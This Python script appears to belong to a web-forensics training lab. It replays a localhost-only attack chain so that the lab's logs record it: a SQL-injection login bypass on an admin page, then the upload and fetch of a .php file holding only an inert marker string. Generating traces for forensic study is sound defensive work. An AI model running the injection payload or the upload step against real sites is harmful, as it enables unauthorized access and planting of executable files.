"""Replay the fixed localhost-only Scenario B POST login chain."""

import http.cookiejar
import time
import urllib.parse
import urllib.request

from common import (
    STEP_DELAY_SECONDS,
    finish_scenario,
    lab_request,
    multipart_file,
    start_fresh_lab,
)

USER_AGENT = "webforensics-lab/1.0 scenario-b"
ATTACKER = "192.0.2.10"
MARKER = b"LAB-FORENSICS-MARKER-B-v1\n"


def run() -> None:
    start_fresh_lab()
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar())
    )

    failed_login = lab_request(
        opener,
        "/admin/login.php",
        ATTACKER,
        user_agent=USER_AGENT,
        data=urllib.parse.urlencode(
            {"username": "admin", "password": "wrong-lab-password"}
        ).encode(),
        content_type="application/x-www-form-urlencoded",
        status=401,
    )
    if b"Login failed" not in failed_login:
        raise RuntimeError("normal POST login did not fail as expected")
    time.sleep(STEP_DELAY_SECONDS)

    lab_request(opener, "/", "198.51.100.20", user_agent=USER_AGENT)
    time.sleep(STEP_DELAY_SECONDS)
    lab_request(opener, "/product.php?id=2", "203.0.113.20", user_agent=USER_AGENT)
    time.sleep(STEP_DELAY_SECONDS)

    username = "admin' OR '1'='1' -- "
    login = lab_request(
        opener,
        "/admin/login.php",
        ATTACKER,
        user_agent=USER_AGENT,
        data=urllib.parse.urlencode({"username": username, "password": ""}).encode(),
        content_type="application/x-www-form-urlencoded",
    )
    if b"Login successful" not in login:
        raise RuntimeError("POST SQLi login did not establish the lab session")
    time.sleep(STEP_DELAY_SECONDS)

    upload, content_type = multipart_file(
        "file",
        "scenario-b-marker.php",
        MARKER,
        "application/octet-stream",
        boundary="----webforensics-lab-scenario-b",
    )
    result = lab_request(
        opener,
        "/admin/auth_upload.php",
        ATTACKER,
        user_agent=USER_AGENT,
        data=upload,
        content_type=content_type,
    )
    if b"/uploads/scenario-b-marker.php" not in result:
        raise RuntimeError("authenticated upload did not confirm marker path")
    time.sleep(STEP_DELAY_SECONDS)

    if (
        lab_request(
            opener,
            "/uploads/scenario-b-marker.php",
            ATTACKER,
            user_agent=USER_AGENT,
        )
        != MARKER
    ):
        raise RuntimeError("marker request did not return expected inert text")
    finish_scenario()
    print("Scenario B replay complete: six fixed requests through the loopback edge.")


if __name__ == "__main__":
    run()
